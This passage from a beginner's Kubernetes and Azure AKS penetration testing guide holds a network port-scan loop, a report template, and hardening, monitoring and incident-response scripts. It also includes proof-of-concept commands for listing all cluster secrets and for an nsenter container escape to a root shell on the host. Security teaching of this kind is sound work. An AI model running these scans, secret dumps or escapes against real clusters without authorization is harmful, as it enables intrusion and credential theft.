for port in 2379 6443 8080 8443 10250 10255 10256 9090; do
    echo "Scanning port $port..."
    nmap -p $port --open 10.0.0.0/8 | grep -E "open|Discovered"
done

echo "=== Network discovery complete ==="
```

---

## Reporting and Remediation

### Vulnerability Classification

**Critical Vulnerabilities:**
- Cluster admin access via RBAC misconfiguration
- Container escape to host system
- etcd unauthorized access
- Service account token with admin privileges
- Unencrypted communication with API server

**High Vulnerabilities:**
- Privilege escalation via dangerous RBAC verbs
- Secrets accessible across namespaces
- Containers running as root with capabilities
- Network policies not enforced
- Admission controllers bypassed

**Medium Vulnerabilities:**
- Service account auto-mounting enabled
- Resource limits not set
- Security contexts not defined
- Image pull policies set to Always
- Deprecated API versions in use

**Low/Informational:**
- Default service accounts used
- Non-latest Kubernetes version
- Missing security labels
- Verbose logging enabled
- Default namespace usage

### Sample Vulnerability Report Template

```markdown
# Kubernetes Penetration Testing Report

## Executive Summary

### Test Overview
- **Target:** AKS Cluster (cluster-name)
- **Test Date:** [Date]
- **Test Type:** Gray-box penetration test
- **Tester:** [Name]

### Key Findings
- X Critical vulnerabilities
- Y High vulnerabilities  
- Z Medium vulnerabilities

### Risk Rating: [HIGH/MEDIUM/LOW]

## Technical Findings

### CVE-001: Privilege Escalation via RBAC Misconfiguration

**Severity:** Critical
**CVSS Score:** 9.8

**Description:**
The default service account in the 'production' namespace has been granted cluster-admin privileges through an overly permissive ClusterRoleBinding. This allows any pod running in this namespace to perform any action on any resource in the cluster.

**Impact:**
- Complete cluster compromise
- Data exfiltration from all namespaces
- Ability to create persistent backdoors
- Lateral movement to connected systems

**Proof of Concept:**
```bash
# From within compromised pod
kubectl auth can-i "*" "*"
# Output: yes

kubectl get secrets --all-namespaces
# Successfully lists all cluster secrets
```

**Remediation:**
1. Remove cluster-admin binding from default service accounts
2. Create custom roles with minimal required permissions
3. Use namespace-specific roles instead of cluster roles
4. Implement regular RBAC auditing

### CVE-002: Container Escape via Privileged Pod

**Severity:** Critical
**CVSS Score:** 9.3

**Description:**
Multiple pods are configured with `privileged: true` and `hostNetwork: true`, allowing container escape to the underlying host system.

**Impact:**
- Host system compromise
- Access to other containers on the same node
- Ability to read host filesystem and processes
- Potential lateral movement to other nodes

**Proof of Concept:**
```bash
# From privileged container
nsenter -t 1 -m -u -i -n -p /bin/bash
# Now running as root on host system
```

**Remediation:**
1. Remove privileged: true from pod specifications
2. Implement Pod Security Standards/Policies
3. Use security contexts with minimal privileges
4. Regular audit of pod security configurations

## Recommendations

### Immediate Actions (0-30 days)
1. Revoke cluster-admin access from default service accounts
2. Implement Pod Security Standards at cluster level
3. Enable admission controllers for security validation
4. Audit and remediate privileged containers

### Short Term (1-3 months)
1. Implement network policies for traffic segmentation
2. Enable audit logging for API server
3. Deploy security scanning tools (OPA Gatekeeper, Falco)
4. Create security training for development teams

### Long Term (3-6 months)
1. Implement GitOps with security validation
2. Regular penetration testing schedule
3. Security compliance automation
4. Incident response procedures for container security
```

### Remediation Scripts

**1. RBAC Cleanup Script**

```bash
#!/bin/bash
# rbac-cleanup.sh - Remove dangerous RBAC configurations

echo "=== RBAC Security Cleanup ==="

# Find cluster-admin bindings to service accounts
echo "[+] Checking for dangerous cluster-admin bindings..."
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | select(.subjects[]?.kind=="ServiceAccount") | .metadata.name'

# Find bindings with dangerous verbs
echo "[+] Checking for dangerous verb permissions..."
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? | contains("*") or contains("escalate") or contains("bind") or contains("impersonate")) | .metadata.name'

# Audit script for service accounts
echo "[+] Service account audit..."
kubectl get serviceaccounts --all-namespaces | while read ns sa rest; do
    if [ "$ns" != "NAMESPACE" ]; then
        echo "Checking SA: $sa in namespace: $ns"
        kubectl describe clusterrolebindings | grep -A 5 -B 5 "Name:.*$sa"
    fi
done

echo "=== Cleanup complete - Review output and manually remove dangerous bindings ==="
```

**2. Pod Security Hardening Script**

```bash
#!/bin/bash
# pod-security-hardening.sh - Identify and fix insecure pod configurations

echo "=== Pod Security Hardening ==="

# Find privileged pods
echo "[+] Finding privileged pods..."
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.containers[]?.securityContext?.privileged == true) | .metadata.namespace + "/" + .metadata.name'

# Find pods with host access
echo "[+] Finding pods with host access..."
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.hostNetwork == true or .spec.hostPID == true or .spec.hostIPC == true) | .metadata.namespace + "/" + .metadata.name'

# Find pods with dangerous volume mounts
echo "[+] Finding pods with dangerous mounts..."
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.volumes[]?.hostPath?.path == "/" or .spec.volumes[]?.hostPath?.path == "/var/run/docker.sock") | .metadata.namespace + "/" + .metadata.name'

# Generate Pod Security Policy
cat > pod-security-policy.yaml << 'EOF'
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted-psp
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
EOF

echo "[+] Apply the restricted Pod Security Policy:"
echo "kubectl apply -f pod-security-policy.yaml"

echo "=== Hardening analysis complete ==="
```

---

## Best Practices and Countermeasures

### Defense in Depth Strategy

**1. Cluster-Level Security**

```yaml
# Enable Pod Security Standards
apiVersion: v1
kind: Namespace
metadata:
  name: secure-namespace
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**2. Network Security**

```yaml
# Default deny network policy
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: secure-namespace
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

**3. RBAC Best Practices**

```yaml
# Minimal privilege service account
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-service-account
  namespace: app-namespace
automountServiceAccountToken: false
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: app-namespace
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: app-namespace
subjects:
- kind: ServiceAccount
  name: app-service-account
  namespace: app-namespace
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io
```

### Security Monitoring and Detection

**1. Audit Logging Configuration**

```yaml
# Enable API server audit logging
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: Namespace
  namespaces: ["front-end", "default"]
  resources:
  - group: ""
    resources: ["pods", "services"]
  actions: ["get", "list", "create", "update", "patch", "delete"]
```

**2. Falco Rules for Runtime Security**

```yaml
# Custom Falco rule for detecting privilege escalation
- rule: Detect Privilege Escalation
  desc: Detect attempt to change user privileges
  condition: spawned_process and proc.name in (su, sudo, setuid)
  output: Privilege escalation detected (user=%user.name command=%proc.cmdline)
  priority: WARNING
```

### Continuous Security Validation

**1. Automated Security Scanning**

```bash
#!/bin/bash
# security-validation.sh - Continuous security checking

# Run kube-bench for CIS compliance
kube-bench --version 1.20

# Scan images with Trivy
kubectl get pods --all-namespaces -o jsonpath="{..image}" | tr -s '[[:space:]]' '\n' | sort | uniq | while read image; do
    echo "Scanning $image"
    trivy image --exit-code 1 --severity HIGH,CRITICAL $image
done

# Check for RBAC issues
kubectl auth can-i --list --as=system:serviceaccount:default:default

# Validate network policies
kubectl get networkpolicies --all-namespaces
```

**2. GitOps Security Integration**

```yaml
# ArgoCD with security validation
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: secure-app
spec:
  syncPolicy:
    syncOptions:
    - Validate=true
    - CreateNamespace=false
  source:
    repoURL: https://github.com/company/secure-configs
    path: k8s-manifests
    targetRevision: HEAD
    plugin:
      name: security-validator
```

### Incident Response Procedures

**1. Container Compromise Response**

```bash
#!/bin/bash
# incident-response.sh - Container security incident response

COMPROMISED_POD=$1
NAMESPACE=$2

echo "=== Container Security Incident Response ==="
echo "Pod: $COMPROMISED_POD in namespace: $NAMESPACE"

# 1. Immediate containment
echo "[+] Isolating compromised pod..."
kubectl annotate pod $COMPROMISED_POD --namespace=$NAMESPACE security.incident=isolated

# Apply network policy to isolate pod
cat << EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: isolate-$COMPROMISED_POD
  namespace: $NAMESPACE
spec:
  podSelector:
    matchLabels:
      app: $COMPROMISED_POD
  policyTypes:
  - Ingress
  - Egress
EOF

# 2. Evidence collection
echo "[+] Collecting evidence..."
kubectl logs $COMPROMISED_POD --namespace=$NAMESPACE > incident-logs-$(date +%s).txt
kubectl describe pod $COMPROMISED_POD --namespace=$NAMESPACE > incident-description-$(date +%s).txt

# 3. Analysis
echo "[+] Analyzing compromise..."
kubectl get pod $COMPROMISED_POD --namespace=$NAMESPACE -o yaml | grep -E "privileged|hostNetwork|hostPID"

# 4. Check for lateral movement
echo "[+] Checking for lateral movement..."
kubectl get events --namespace=$NAMESPACE --sort-by='.lastTimestamp' | tail -20

echo "=== Incident response complete ==="
```

---

## Conclusion

This comprehensive guide provides a structured approach to Kubernetes penetration testing, particularly focused on Azure Kubernetes Service environments. Key takeaways for beginners:

**Essential Skills Developed:**
- Container and pod security assessment
- RBAC privilege escalation techniques
- Network security testing in Kubernetes
- Azure-specific attack vectors
- Automated testing and reporting

**Critical Areas to Focus On:**
1. **RBAC Misconfigurations** - Often the easiest path to cluster compromise
2. **Container Security** - Privileged containers and capability abuse
3. **Network Segmentation** - Lateral movement prevention
4. **Secret Management** - Token theft and credential abuse
5. **Azure Integration** - Managed identity and cross-tenant attacks

**Next Steps:**
1. Practice in controlled lab environments
2. Stay updated with latest Kubernetes CVEs
3. Contribute to open-source security tools
4. Pursue advanced certifications (CKS, GCIH)
5. Join Kubernetes security communities

**Remember:** Always ensure proper authorization before conducting penetration tests, and follow responsible disclosure practices when discovering vulnerabilities.

This guide serves as a foundation - Kubernetes security is an evolving field, and continuous learning is essential for staying current with new attack vectors and defensive techniques.